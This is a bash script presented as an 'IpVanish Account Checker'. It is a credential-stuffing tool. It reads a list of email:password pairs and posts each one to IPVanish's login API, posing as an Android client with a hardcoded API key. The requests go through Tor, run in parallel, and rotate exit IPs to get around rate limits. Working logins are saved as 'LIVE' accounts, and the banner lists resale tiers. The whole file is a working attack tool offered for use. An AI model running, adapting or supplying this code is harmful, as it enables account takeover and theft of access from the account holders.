#!/bin/bash
merah='\e[91m'
cyan='\e[96m'
kuning='\e[93m'
oren='\033[0;33m' 
margenta='\e[95m'
biru='\e[94m'
ijo="\e[92m"
putih="\e[97m"
normal='\033[0m'
bold='\e[1m'
labelmerah='\e[41m'
labelijo='\e[42m'
labelkuning='\e[43m'
labelpp='\e[45m'
echo -e "\e[38;5;206m"
echo -e "\e[1m"
cat << "EOF"
        ---------------------------------------------------------
                        o   o                    o
                         \ /                     |
                          O    oo o  o o-o  o-o -o-
                         / \  | | |  | |  | |-'  |
                        o   o o-o-o--O o  o o-o  o
                                     |
                                  o--o / IpVanish Account Checker
                                  Rewrite : mtezy
                                  Tier : 1 ~ 1 Month $10.00 USD
                                  Tier : 3 ~ 3 Months $26.99 USD
                                  Tier: 12 ~ 1 Year $77.99 USD
                                  
        ---------------------------------------------------------
 
EOF
 
printf "\e[38;5;50m"
cat << "thanks"
         Thanks : Extreme Crew - ccoocoot ccoocot
                  XAYNET - SGBTeam - Rumah Sakit Jiwa
                  
                  
thanks

register() {
    empas="${biru}${1}/${2}"
    stats="${margenta}[$(date +"%T")]"
	rand1=$(echo $((RANDOM%9999)))
	#cokjancok=$(curl -s --socks5 127.0.0.1:9050 "https://account.ipvanish.com/login")
     #auth=$(echo "$cokjancok" | grep clientToken | grep -Po '(?<=value=")[^;]*' | cut -d '"' -f1)
 #  fetchCookie=$(echo "$cokjancok" | grep -Po '(?<=Set-Cookie:)[^;]*')
   #idCoki=$(echo $cokjancok | grep -Po '(?<=PHPSESSID=)[^;]*')
     login=$(curl -s --socks5 127.0.0.1:9050 "https://account.ipvanish.com/api/v3/login" -X POST \
     -H "User-Agent: okhttp/3.12.0" \
     -H "X-Client: ipvanish" \
     -H "Content-Type: application/json; charset=utf-8" \
     -H "X-Client-Version: 1.2" \
     -H "X-Platform: Android" \
     -d "{\"api_key\":\"15cb936e6d19cd7db1d6f94b96017541\",\"client\":\"Android-3.4.2.4.52477b52477\",\"os\":\"22\",\"password\":\"${2}\",\"username\":\"${1}\",\"uuid\":\"6d29ef61-ff19-4124-a053-e148475cf889\"}")
    if [[ $login == *'"email"'* ]]; then
    name=$(echo $login | grep -Po '(?<="account_type":)[^,]*')
    printf "${stats} ${margenta}[${3}/${totallines}]${normal} ${empas}  => ${labelijo}LIVE${normal} Type: ${ijo}${name}${normal}\n"
    echo "${1}|${2} | Type: ${name}" >> ipvanish.txt
    elif [[ $login == *"username or password provided is incorrect"* ]]; then
    printf "${stats} ${margenta}[${3}/${totallines}]${normal} ${empas}  => ${labelmerah}DIE${normal}\n" 
    elif [[ $login == *"Too many failed attempts"* ]]; then
    printf "${stats} ${margenta}[${3}/${totallines}]${normal} ${empas}  => ${labelpp}UNK${normal}\n" 
    else
    printf "${stats} ${margenta}[${3}/${totallines}]${normal} ${empas}  => ${labelpp}UNK${normal}\n" 
    echo "${login}"
    fi
  
  
	
}

printf "${white}[+] Input HOSTNAME List : "; read LIST
if [[ ! -f $LIST ]]; then
    echo "[-] File $LIST Not Exist"
    exit 1
fi

totallines=$(wc -l < ${LIST});
itung=1
index=$((pp++))
printf " '-> Total HOSTNAME On List :${white} ${bgreen} $(grep "" -c $LIST) ${cbg}\n"
printf "${white}[+] Threads          : "; read THREADS
printf "${white} '-> Set Threads To ${bgreen} $THREADS ${cbg}\n"
pp=1
IFS=$'\r\n' GLOBIGNORE='*' command eval 'mailist=($(cat $LIST))'
for (( i = 0; i < ${#mailist[@]}; i++ )); do
  index=$((itung++))
    username="${mailist[$i]}"
    IFS=':' read -r -a array <<< "$username"
    email=${array[0]}
    password=${array[1]}
   tt=$(expr $pp % $THREADS)
   if [[ $tt == 0 && $pp > 0 ]]; then
   percentage=$((100*$pp/$totallines))
   printf "   >> \e[1;33mSleep for 5s Total Checked: ${pp}(${percentage}%%)\n"
   killall -HUP tor
   sleep 5
   
   fi
   let pp++
   jam=$(date '+%H')
   menit=$(date '+%M')
   detik=$(date '+%S')
   

	register "${email}" "${password}" "${index}" &
	total=$(cat ipvanish.txt | wc -l)
	
done
wait

